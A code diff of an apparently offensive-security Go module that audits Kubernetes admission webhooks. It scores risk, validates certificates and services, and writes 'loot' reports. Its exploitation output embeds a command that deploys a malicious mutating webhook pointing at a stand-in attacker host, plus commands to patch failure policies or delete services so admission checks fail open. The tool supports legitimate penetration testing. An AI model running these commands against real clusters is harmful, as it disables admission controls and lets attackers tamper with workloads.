-			Name:     "Webhook-Enum",
-			Contents: strings.Join(lootEnum, "\n"),
-		},
-		{
-			Name:     "Webhook-Security-Analysis",
-			Contents: strings.Join(lootSecurityAnalysis, "\n"),
-		},
-		{
-			Name:     "Webhook-Exploitation-Bypass",
-			Contents: strings.Join(lootExploitation, "\n"),
-		},
-		{
-			Name:     "Webhook-Service-Validation",
-			Contents: strings.Join(lootServiceValidation, "\n"),
-		},
 	}
 
 	err = internal.HandleOutput(
@@ -778,10 +671,19 @@ kubectl patch mutatingwebhookconfiguration <webhook-name> --type json -p='[{"op"
 	}
 
 	if len(outputRows) > 0 {
-		criticalCount := len(criticalFindings)
-		highCount := len(highFindings)
+		criticalCount := 0
+		highCount := 0
+		for _, f := range findings {
+			if f.RiskLevel == "CRITICAL" {
+				criticalCount++
+			} else if f.RiskLevel == "HIGH" {
+				highCount++
+			}
+		}
+
 		if criticalCount > 0 || highCount > 0 {
-			logger.InfoM(fmt.Sprintf("%d webhooks found (%d CRITICAL, %d HIGH risk)", len(outputRows), criticalCount, highCount), globals.K8S_WEBHOOKS_MODULE_NAME)
+			logger.InfoM(fmt.Sprintf("%d webhooks found (%d CRITICAL, %d HIGH risk)",
+				len(outputRows), criticalCount, highCount), globals.K8S_WEBHOOKS_MODULE_NAME)
 		} else {
 			logger.InfoM(fmt.Sprintf("%d webhooks found", len(outputRows)), globals.K8S_WEBHOOKS_MODULE_NAME)
 		}
@@ -792,14 +694,661 @@ kubectl patch mutatingwebhookconfiguration <webhook-name> --type json -p='[{"op"
 	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_WEBHOOKS_MODULE_NAME), globals.K8S_WEBHOOKS_MODULE_NAME)
 }
 
-// helper to stringify rules
-func webhookRulesToString(rules []admissionv1.RuleWithOperations) string {
-	if len(rules) == 0 {
-		return "<none>"
+// ====================
+// Helper Functions
+// ====================
+
+func analyzeWebhookCertificate(caBundle string) (expiry *time.Time, issuer, subject string, valid bool, err error) {
+	if caBundle == "" {
+		return nil, "", "", false, fmt.Errorf("no CA bundle")
 	}
-	var sb []string
-	for _, r := range rules {
-		sb = append(sb, fmt.Sprintf("%v %v", r.Operations, r.Resources))
+
+	decoded, err := base64.StdEncoding.DecodeString(caBundle)
+	if err != nil {
+		return nil, "", "", false, err
 	}
-	return strings.Join(sb, "; ")
+
+	block, _ := pem.Decode(decoded)
+	if block == nil {
+		return nil, "", "", false, fmt.Errorf("failed to parse PEM")
+	}
+
+	cert, err := x509.ParseCertificate(block.Bytes)
+	if err != nil {
+		return nil, "", "", false, err
+	}
+
+	now := time.Now()
+	valid = now.After(cert.NotBefore) && now.Before(cert.NotAfter)
+
+	return &cert.NotAfter, cert.Issuer.String(), cert.Subject.String(), valid, nil
+}
+
+func validateWebhookService(ctx context.Context, clientset *kubernetes.Clientset, namespace, serviceName string) (exists bool, endpointCount int, err error) {
+	// Check service exists
+	_, err = clientset.CoreV1().Services(namespace).Get(ctx, serviceName, metav1.GetOptions{})
+	if err != nil {
+		return false, 0, err
+	}
+	exists = true
+
+	// Check endpoints
+	endpoints, err := clientset.CoreV1().Endpoints(namespace).Get(ctx, serviceName, metav1.GetOptions{})
+	if err != nil {
+		return exists, 0, err
+	}
+
+	for _, subset := range endpoints.Subsets {
+		endpointCount += len(subset.Addresses)
+	}
+
+	return exists, endpointCount, nil
+}
+
+func getWebhookPodCount(ctx context.Context, clientset *kubernetes.Clientset, namespace, serviceName string) int {
+	// Get service to find selector
+	svc, err := clientset.CoreV1().Services(namespace).Get(ctx, serviceName, metav1.GetOptions{})
+	if err != nil {
+		return 0
+	}
+
+	// List pods with service selector
+	labelSelector := metav1.FormatLabelSelector(&metav1.LabelSelector{MatchLabels: svc.Spec.Selector})
+	pods, err := clientset.CoreV1().Pods(namespace).List(ctx, metav1.ListOptions{
+		LabelSelector: labelSelector,
+	})
+	if err != nil {
+		return 0
+	}
+
+	runningCount := 0
+	for _, pod := range pods.Items {
+		if pod.Status.Phase == corev1.PodRunning {
+			runningCount++
+		}
+	}
+
+	return runningCount
+}
+
+func calculatePerformanceImpact(finding *WebhookFinding) (impact string, estimatedLatency int32) {
+	score := 0
+
+	// Timeout contributes to latency
+	if finding.TimeoutSeconds > 20 {
+		score += 40
+	} else if finding.TimeoutSeconds > 10 {
+		score += 20
+	}
+
+	// Fail policy means API waits
+	if finding.FailurePolicy == "Fail" {
+		score += 20
+	}
+
+	// Wildcard operations = called frequently
+	hasWildcard := false
+	for _, op := range finding.Operations {
+		if op == "*" {
+			hasWildcard = true
+			break
+		}
+	}
+	if hasWildcard {
+		score += 30
+	}
+
+	// Many resources = called frequently
+	if len(finding.Resources) > 10 {
+		score += 20
+	}
+
+	// External URL adds network latency
+	if finding.IsExternal {
+		score += 15
+	}
+
+	// Reinvocation doubles the calls
+	if finding.ReinvocationPolicy == "IfNeeded" {
+		score += 25
+	}
+
+	// No endpoints = timeout always
+	if finding.ServiceDangling || finding.EndpointCount == 0 {
+		score += 50
+	}
+
+	estimatedLatency = finding.TimeoutSeconds * 1000
+
+	if score >= 75 {
+		return "CRITICAL", estimatedLatency
+	} else if score >= 50 {
+		return "HIGH", estimatedLatency
+	} else if score >= 25 {
+		return "MEDIUM", estimatedLatency
+	}
+	return "LOW", estimatedLatency
+}
+
+func calculateWebhookRiskScore(finding *WebhookFinding, hasWildcardOps, hasWildcardRes, interceptsSensitive bool) int {
+	score := 0
+
+	// External webhooks
+	if finding.IsExternal {
+		score += 40
+		if !finding.HasCABundle {
+			score += 20
+		}
+	}
+
+	// Wildcard operations/resources
+	if hasWildcardOps {
+		score += 25
+	}
+	if hasWildcardRes {
+		score += 30
+	}
+
+	// Sensitive resources
+	if interceptsSensitive {
+		score += 30
+	}
+
+	// Fail policy with high timeout
+	if finding.FailurePolicy == "Fail" && finding.TimeoutSeconds > 15 {
+		score += 20
+	}
+
+	// Certificate issues
+	if finding.DaysUntilExpiry < 0 {
+		score += 35 // Expired
+	} else if finding.DaysUntilExpiry > 0 && finding.DaysUntilExpiry < 30 {
+		score += 15 // Expiring soon
+	}
+
+	// Service issues
+	if finding.ServiceDangling {
+		score += 40 // No service = potential DOS
+	} else if finding.EndpointCount == 0 {
+		score += 35 // No endpoints = potential DOS
+	}
+
+	// Cross-namespace
+	if finding.CrossNamespaceService {
+		score += 15
+	}
+
+	// Deprecated API
+	if finding.DeprecatedAPIVersion {
+		score += 10
+	}
+
+	// Performance impact
+	if finding.PerformanceImpact == "CRITICAL" {
+		score += 20
+	} else if finding.PerformanceImpact == "HIGH" {
+		score += 10
+	}
+
+	// Webhook chains
+	if len(finding.ChainedWithWebhooks) > 2 {
+		score += 15
+	} else if len(finding.ChainedWithWebhooks) > 0 {
+		score += 5
+	}
+
+	// Reinvocation
+	if finding.ReinvocationPolicy == "IfNeeded" {
+		score += 10
+	}
+
+	return webhooksMin(score, 100)
+}
+
+func detectWebhookChains(findings []WebhookFinding) map[string][]string {
+	// resourceKey -> list of webhook names
+	chains := make(map[string][]string)
+
+	for _, f := range findings {
+		for _, resource := range f.Resources {
+			for _, op := range f.Operations {
+				key := fmt.Sprintf("%s:%s:%s", f.Type, resource, op)
+				chains[key] = append(chains[key], f.Name)
+			}
+		}
+	}
+
+	// Return only chains with multiple webhooks
+	result := make(map[string][]string)
+	for key, webhooks := range chains {
+		if len(webhooks) > 1 {
+			result[key] = webhooks
+		}
+	}
+
+	return result
+}
+
+func detectBypassOpportunities(findings []WebhookFinding) []BypassOpportunity {
+	opportunities := []BypassOpportunity{}
+
+	for _, f := range findings {
+		// Namespace selector bypass
+		if strings.Contains(f.Scope, "namespace-scoped") {
+			opportunities = append(opportunities, BypassOpportunity{
+				WebhookName:    f.Name,
+				WebhookType:    f.Type,
+				BypassType:     "namespace-selector",
+				BypassMethod:   "Create namespace with non-matching labels",
+				ExploitCommand: fmt.Sprintf("kubectl create ns bypass-%s", strings.ToLower(f.Name[:10])),
+				RiskLevel:      "HIGH",
+			})
+		}
+
+		// Object selector bypass
+		if strings.Contains(f.Scope, "label-filtered") {
+			opportunities = append(opportunities, BypassOpportunity{
+				WebhookName:    f.Name,
+				WebhookType:    f.Type,
+				BypassType:     "object-selector",
+				BypassMethod:   "Create objects with non-matching labels",
+				ExploitCommand: "kubectl run bypass-pod --image=alpine --labels=bypass=true",
+				RiskLevel:      "HIGH",
+			})
+		}
+
+		// Failure policy bypass
+		if f.FailurePolicy == "Ignore" {
+			opportunities = append(opportunities, BypassOpportunity{
+				WebhookName:    f.Name,
+				WebhookType:    f.Type,
+				BypassType:     "failure-policy",
+				BypassMethod:   "Make webhook unavailable, requests will be allowed",
+				ExploitCommand: fmt.Sprintf("kubectl delete svc %s -n %s", f.Service, f.Namespace),
+				RiskLevel:      "CRITICAL",
+			})
+		}
+
+		// Dangling webhook bypass
+		if f.ServiceDangling {
+			opportunities = append(opportunities, BypassOpportunity{
+				WebhookName:    f.Name,
+				WebhookType:    f.Type,
+				BypassType:     "dangling-service",
+				BypassMethod:   "Webhook has no backend service - requests timeout or fail open",
+				ExploitCommand: "# Deploy resources - webhook will fail",
+				RiskLevel:      "CRITICAL",
+			})
+		}
+	}
+
+	return opportunities
+}
+
+func generateWebhookLootFiles(findings []WebhookFinding, bypasses []BypassOpportunity, chains map[string][]string, kubeContext string) []internal.LootFile {
+	var lootFiles []internal.LootFile
+
+	// 1. Security Analysis
+	lootSecurity := generateSecurityAnalysisLoot(findings, kubeContext)
+	lootFiles = append(lootFiles, internal.LootFile{
+		Name:     "Webhook-Security-Analysis",
+		Contents: strings.Join(lootSecurity, "\n"),
+	})
+
+	// 2. Certificate Analysis
+	lootCerts := generateCertificateLoot(findings, kubeContext)
+	lootFiles = append(lootFiles, internal.LootFile{
+		Name:     "Webhook-Certificates",
+		Contents: strings.Join(lootCerts, "\n"),
+	})
+
+	// 3. Performance Analysis
+	lootPerf := generatePerformanceLoot(findings, kubeContext)
+	lootFiles = append(lootFiles, internal.LootFile{
+		Name:     "Webhook-Performance",
+		Contents: strings.Join(lootPerf, "\n"),
+	})
+
+	// 4. Webhook Chains
+	lootChains := generateChainsLoot(chains, findings, kubeContext)
+	lootFiles = append(lootFiles, internal.LootFile{
+		Name:     "Webhook-Chains",
+		Contents: strings.Join(lootChains, "\n"),
+	})
+
+	// 5. Bypass Opportunities
+	lootBypass := generateBypassLoot(bypasses, kubeContext)
+	lootFiles = append(lootFiles, internal.LootFile{
+		Name:     "Webhook-Bypass-Opportunities",
+		Contents: strings.Join(lootBypass, "\n"),
+	})
+
+	// 6. Service Validation
+	lootService := generateServiceValidationLoot(findings, kubeContext)
+	lootFiles = append(lootFiles, internal.LootFile{
+		Name:     "Webhook-Service-Validation",
+		Contents: strings.Join(lootService, "\n"),
+	})
+
+	// 7. Exploitation Techniques
+	lootExploit := generateExploitationLoot(findings, kubeContext)
+	lootFiles = append(lootFiles, internal.LootFile{
+		Name:     "Webhook-Exploitation",
+		Contents: strings.Join(lootExploit, "\n"),
+	})
+
+	return lootFiles
+}
+
+func generateSecurityAnalysisLoot(findings []WebhookFinding, kubeContext string) []string {
+	loot := []string{`#####################################
+##### Webhook Security Analysis
+#####################################
+#
+# Prioritized security findings by risk level
+#
+`}
+
+	if kubeContext != "" {
+		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+	}
+
+	// Group by risk
+	critical := []WebhookFinding{}
+	high := []WebhookFinding{}
+	medium := []WebhookFinding{}
+
+	for _, f := range findings {
+		switch f.RiskLevel {
+		case "CRITICAL":
+			critical = append(critical, f)
+		case "HIGH":
+			high = append(high, f)
+		case "MEDIUM":
+			medium = append(medium, f)
+		}
+	}
+
+	if len(critical) > 0 {
+		loot = append(loot, fmt.Sprintf("\n## CRITICAL RISK WEBHOOKS (%d found)\n", len(critical)))
+		for _, f := range critical {
+			loot = append(loot, fmt.Sprintf("\n### [CRITICAL - Score:%d] %s: %s", f.RiskScore, f.Type, f.Name))
+			loot = append(loot, fmt.Sprintf("# Risk: %s", f.RiskDescription))
+			if len(f.SecurityIssues) > 0 {
+				loot = append(loot, fmt.Sprintf("# Security Issues: %d", len(f.SecurityIssues)))
+				for _, issue := range f.SecurityIssues {
+					loot = append(loot, fmt.Sprintf("#   - %s", issue))
+				}
+			}
+			if len(f.SensitiveResources) > 0 {
+				loot = append(loot, fmt.Sprintf("# SENSITIVE RESOURCES: %v", f.SensitiveResources))
+			}
+		}
+	}
+
+	if len(high) > 0 {
+		loot = append(loot, fmt.Sprintf("\n## HIGH RISK WEBHOOKS (%d found)\n", len(high)))
+		for _, f := range high {
+			loot = append(loot, fmt.Sprintf("\n### [HIGH - Score:%d] %s: %s", f.RiskScore, f.Type, f.Name))
+			if len(f.SecurityIssues) > 0 {
+				for _, issue := range f.SecurityIssues {
+					loot = append(loot, fmt.Sprintf("# - %s", issue))
+				}
+			}
+		}
+	}
+
+	return loot
+}
+
+func generateCertificateLoot(findings []WebhookFinding, kubeContext string) []string {
+	loot := []string{`#####################################
+##### Webhook Certificate Analysis
+#####################################
+#
+# Certificate expiry and validity analysis
+#
+`}
+
+	if kubeContext != "" {
+		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+	}
+
+	expired := []WebhookFinding{}
+	expiringSoon := []WebhookFinding{}
+	valid := []WebhookFinding{}
+
+	for _, f := range findings {
+		if f.HasCABundle {
+			if f.DaysUntilExpiry < 0 {
+				expired = append(expired, f)
+			} else if f.DaysUntilExpiry < 30 {
+				expiringSoon = append(expiringSoon, f)
+			} else {
+				valid = append(valid, f)
+			}
+		}
+	}
+
+	if len(expired) > 0 {
+		loot = append(loot, fmt.Sprintf("\n## EXPIRED CERTIFICATES (%d found)\n", len(expired)))
+		for _, f := range expired {
+			loot = append(loot, fmt.Sprintf("\n### %s: %s", f.Type, f.Name))
+			loot = append(loot, fmt.Sprintf("# EXPIRED %d days ago", -f.DaysUntilExpiry))
+			loot = append(loot, fmt.Sprintf("# Subject: %s", f.CertificateSubject))
+		}
+	}
+
+	if len(expiringSoon) > 0 {
+		loot = append(loot, fmt.Sprintf("\n## EXPIRING SOON (%d found)\n", len(expiringSoon)))
+		for _, f := range expiringSoon {
+			loot = append(loot, fmt.Sprintf("\n### %s: %s - Expires in %d days", f.Type, f.Name, f.DaysUntilExpiry))
+		}
+	}
+
+	return loot
+}
+
+func generatePerformanceLoot(findings []WebhookFinding, kubeContext string) []string {
+	loot := []string{`#####################################
+##### Webhook Performance Analysis
+#####################################
+#
+# Performance impact assessment
+#
+`}
+
+	if kubeContext != "" {
+		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+	}
+
+	critical := []WebhookFinding{}
+	high := []WebhookFinding{}
+
+	for _, f := range findings {
+		if f.PerformanceImpact == "CRITICAL" {
+			critical = append(critical, f)
+		} else if f.PerformanceImpact == "HIGH" {
+			high = append(high, f)
+		}
+	}
+
+	if len(critical) > 0 {
+		loot = append(loot, fmt.Sprintf("\n## CRITICAL PERFORMANCE IMPACT (%d webhooks)\n", len(critical)))
+		for _, f := range critical {
+			loot = append(loot, fmt.Sprintf("\n### %s: %s", f.Type, f.Name))
+			loot = append(loot, fmt.Sprintf("# Timeout: %ds | Latency: %dms", f.TimeoutSeconds, f.EstimatedLatencyMs))
+			loot = append(loot, fmt.Sprintf("# Failure Policy: %s", f.FailurePolicy))
+			if len(f.Operations) > 0 {
+				loot = append(loot, fmt.Sprintf("# Operations: %v", f.Operations))
+			}
+		}
+	}
+
+	return loot
+}
+
+func generateChainsLoot(chains map[string][]string, findings []WebhookFinding, kubeContext string) []string {
+	loot := []string{`#####################################
+##### Webhook Chains Detection
+#####################################
+#
+# Multiple webhooks on same resources
+#
+`}
+
+	if kubeContext != "" {
+		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+	}
+
+	if len(chains) == 0 {
+		loot = append(loot, "\n# No webhook chains detected\n")
+		return loot
+	}
+
+	loot = append(loot, fmt.Sprintf("\n## WEBHOOK CHAINS DETECTED (%d chains)\n", len(chains)))
+
+	for key, webhooks := range chains {
+		loot = append(loot, fmt.Sprintf("\n### Chain: %s", key))
+		loot = append(loot, fmt.Sprintf("# Webhooks in chain: %d", len(webhooks)))
+		for i, wh := range webhooks {
+			loot = append(loot, fmt.Sprintf("#   %d. %s", i+1, wh))
+		}
+	}
+
+	return loot
+}
+
+func generateBypassLoot(bypasses []BypassOpportunity, kubeContext string) []string {
+	loot := []string{`#####################################
+##### Webhook Bypass Opportunities
+#####################################
+#
+# Identified bypass techniques
+#
+`}
+
+	if kubeContext != "" {
+		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+	}
+
+	if len(bypasses) == 0 {
+		loot = append(loot, "\n# No bypass opportunities detected\n")
+		return loot
+	}
+
+	loot = append(loot, fmt.Sprintf("\n## BYPASS OPPORTUNITIES (%d found)\n", len(bypasses)))
+
+	for _, b := range bypasses {
+		loot = append(loot, fmt.Sprintf("\n### [%s] %s: %s", b.RiskLevel, b.WebhookType, b.WebhookName))
+		loot = append(loot, fmt.Sprintf("# Bypass Type: %s", b.BypassType))
+		loot = append(loot, fmt.Sprintf("# Method: %s", b.BypassMethod))
+		loot = append(loot, fmt.Sprintf("# Exploit: %s", b.ExploitCommand))
+	}
+
+	return loot
+}
+
+func generateServiceValidationLoot(findings []WebhookFinding, kubeContext string) []string {
+	loot := []string{`#####################################
+##### Webhook Service Validation
+#####################################
+#
+# Service existence and endpoint health
+#
+`}
+
+	if kubeContext != "" {
+		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+	}
+
+	dangling := []WebhookFinding{}
+	noEndpoints := []WebhookFinding{}
+
+	for _, f := range findings {
+		if f.ServiceDangling {
+			dangling = append(dangling, f)
+		} else if f.ServiceExists && f.EndpointCount == 0 {
+			noEndpoints = append(noEndpoints, f)
+		}
+	}
+
+	if len(dangling) > 0 {
+		loot = append(loot, fmt.Sprintf("\n## DANGLING WEBHOOKS (%d found)\n", len(dangling)))
+		loot = append(loot, "# These webhooks reference non-existent services\n")
+		for _, f := range dangling {
+			loot = append(loot, fmt.Sprintf("\n### %s: %s", f.Type, f.Name))
+			loot = append(loot, fmt.Sprintf("# Expected: %s/%s (DOES NOT EXIST)", f.Namespace, f.Service))
+		}
+	}
+
+	if len(noEndpoints) > 0 {
+		loot = append(loot, fmt.Sprintf("\n## NO ENDPOINTS (%d found)\n", len(noEndpoints)))
+		for _, f := range noEndpoints {
+			loot = append(loot, fmt.Sprintf("\n### %s: %s", f.Type, f.Name))
+			loot = append(loot, fmt.Sprintf("# Service: %s/%s (no endpoints)", f.Namespace, f.Service))
+		}
+	}
+
+	return loot
+}
+
+func generateExploitationLoot(findings []WebhookFinding, kubeContext string) []string {
+	loot := []string{`#####################################
+##### Webhook Exploitation Techniques
+#####################################
+#
+# MANUAL EXECUTION REQUIRED
+# Educational purposes - use responsibly
+#
+`}
+
+	if kubeContext != "" {
+		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+	}
+
+	loot = append(loot, `
+## 1. Deploy Malicious Webhook
+# If you can create webhook configurations:
+
+cat <<EOF | kubectl apply -f -
+apiVersion: admissionregistration.k8s.io/v1
+kind: MutatingWebhookConfiguration
+metadata:
+  name: malicious-webhook
+webhooks:
+- name: inject.malicious.com
+  clientConfig:
+    url: https://attacker-server.com/mutate
+  rules:
+  - operations: ["CREATE"]
+    apiGroups: [""]
+    apiVersions: ["v1"]
+    resources: ["pods"]
+  admissionReviewVersions: ["v1"]
+  sideEffects: None
+  failurePolicy: Ignore
+EOF
+
+## 2. Modify Existing Webhook
+# Change failurePolicy to bypass:
+kubectl patch mutatingwebhookconfiguration <name> -p '{"webhooks":[{"name":"<webhook>","failurePolicy":"Ignore"}]}'
+
+## 3. External Webhooks Found:
+`)
+
+	for _, f := range findings {
+		if f.IsExternal {
+			loot = append(loot, fmt.Sprintf("# - %s: %s -> %s", f.Type, f.Name, f.Path))
+		}
+	}
+
+	return loot
+}
+
+func webhooksMin(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 }
